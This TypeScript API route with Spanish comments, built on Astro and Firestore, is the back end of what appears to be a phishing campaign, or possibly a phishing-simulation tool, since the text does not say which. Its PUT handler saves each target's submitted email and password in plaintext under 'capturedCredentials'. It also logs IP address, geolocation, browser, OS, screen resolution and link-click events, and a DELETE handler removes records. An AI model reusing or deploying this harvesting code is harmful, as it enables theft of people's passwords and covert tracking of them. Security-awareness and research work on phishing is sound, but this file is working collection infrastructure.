import type { APIRoute } from "astro";
import { app } from "@/firebase/server";
import { FieldValue, getFirestore } from "firebase-admin/firestore";
import { UAParser } from "ua-parser-js";
import type { PhishingUser } from "@/types";

const db = getFirestore(app);
const phishingUsersRef = db.collection("phishingUsers");

export const PUT: APIRoute = async ({ params, request }) => {
  try {
    const userId = params.id;
    if (!userId)
      return new Response(JSON.stringify({ error: "ID requerido" }), {
        status: 400,
      });

    const userRef = phishingUsersRef.doc(userId);
    const userSnapshot = await userRef.get();

    if (!userSnapshot.exists) {
      return new Response(JSON.stringify({ error: "Usuario no encontrado" }), {
        status: 404,
      });
    }

    const currentData = userSnapshot.data() as PhishingUser;
    const data = await request.json();
    const userAgent = data.metadata?.userAgent || "";
    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();
    const os = parser.getOS();

    // Actualización atómica con FieldValue y protección de datos existentes
    const updateData: any = {
      "status.lastActivityAt": FieldValue.serverTimestamp(),
    };

    // Solo actualizar metadatos si son desconocidos o vacíos
    if (!currentData.metadata?.ip || currentData.metadata.ip === "unknown") {
      updateData["metadata.ip"] = data.metadata?.ip || "unknown";
    }

    let currentGeolocation = currentData.metadata?.geolocation;
    let incomingGeolocation = data.metadata?.geolocation;

    // Actualizar solo los campos de geolocalización que sean unknown o 0
    if (incomingGeolocation) {
      const geoUpdates: Record<string, any> = {};

      if (!currentGeolocation?.city || currentGeolocation.city === "unknown") {
        geoUpdates["metadata.geolocation.city"] =
          incomingGeolocation.city || "unknown";
      }

      if (
        !currentGeolocation?.country ||
        currentGeolocation.country === "unknown"
      ) {
        geoUpdates["metadata.geolocation.country"] =
          incomingGeolocation.country || "unknown";
      }

      if (!currentGeolocation?.lat || currentGeolocation.lat === 0) {
        geoUpdates["metadata.geolocation.lat"] = incomingGeolocation.lat || 0;
      }

      if (!currentGeolocation?.lon || currentGeolocation.lon === 0) {
        geoUpdates["metadata.geolocation.lon"] = incomingGeolocation.lon || 0;
      }

      // Agregar las actualizaciones de geolocalización al objeto principal de actualización
      if (Object.keys(geoUpdates).length > 0) {
        Object.assign(updateData, geoUpdates);
      }
    }

    if (!currentData.metadata?.userAgent) {
      updateData["metadata.userAgent"] = userAgent;
    }

    if (
      !currentData.metadata?.device?.os ||
      currentData.metadata.device.os === "unknown"
    ) {
      updateData["metadata.device.os"] = os.name || "unknown";
    }

    if (
      !currentData.metadata?.device?.browser ||
      currentData.metadata.device.browser === "unknown"
    ) {
      updateData["metadata.device.browser"] = browser.name || "unknown";
    }

    if (
      !currentData.metadata?.device?.screenResolution ||
      currentData.metadata.device.screenResolution === "unknown"
    ) {
      updateData["metadata.device.screenResolution"] =
        data.metadata?.device?.screenResolution || "unknown";
    }

    // Solo actualizar credenciales si no existen
    if (!currentData.capturedCredentials?.email && data.email) {
      updateData["capturedCredentials.email"] = data.email;
      updateData["status.formSubmitted"] = true;
    }

    if (!currentData.capturedCredentials?.password && data.password) {
      updateData["capturedCredentials.password"] = data.password;
      updateData["status.formSubmitted"] = true;
    }

    // Solo registrar el evento si hay cambios reales o es el primer LINK_CLICKED
    const isFirstLinkClick = !currentData.events?.some(
      (event) => event.type === "LINK_CLICKED"
    );

    if (isFirstLinkClick) {
      // Añadir el evento LINK_CLICKED
      await userRef.update({
        events: FieldValue.arrayUnion({
          type: "LINK_CLICKED",
          timestamp: new Date().toISOString(),
          data: data,
        })
      });
    }

    // Solo actualizar si hay cambios
    if (Object.keys(updateData).length > 0) {
      // Añadir el evento UPDATE_DATA
      await userRef.update({
        ...updateData,
        events: FieldValue.arrayUnion({
          type: "UPDATE_DATA",
          timestamp: new Date().toISOString(),
          data: data,
        })
      });
    }

    return new Response(JSON.stringify({ success: true }), { status: 200 });
  } catch (error) {
    console.error("Error:", error);
    return new Response(JSON.stringify({ error: "Error en servidor" }), {
      status: 500,
    });
  }
};

// Eliminar un usuario
export const DELETE: APIRoute = async ({ params }) => {
  try {
    const userId = params.id;
    if (!userId) {
      return new Response(
        JSON.stringify({ error: "ID de usuario no proporcionado" }),
        {
          status: 400,
        }
      );
    }

    // Verificar si el usuario existe antes de intentar eliminarlo
    const userRef = phishingUsersRef.doc(userId);
    const userDoc = await userRef.get();

    if (!userDoc.exists) {
      return new Response(JSON.stringify({ error: "Usuario no encontrado" }), {
        status: 404,
      });
    }

    await userRef.delete();
    return new Response(JSON.stringify({ message: "Usuario eliminado" }), {
      status: 200,
    });
  } catch (error: any) {
    console.error("Error al eliminar usuario:", error);

    // Manejar específicamente el error NOT_FOUND
    if (error.code === 5) {
      return new Response(JSON.stringify({ error: "Usuario no encontrado" }), {
        status: 404,
      });
    }

    return new Response(
      JSON.stringify({
        error: "Error al eliminar usuario",
        details: error.message,
      }),
      {
        status: 500,
      }
    );
  }
};
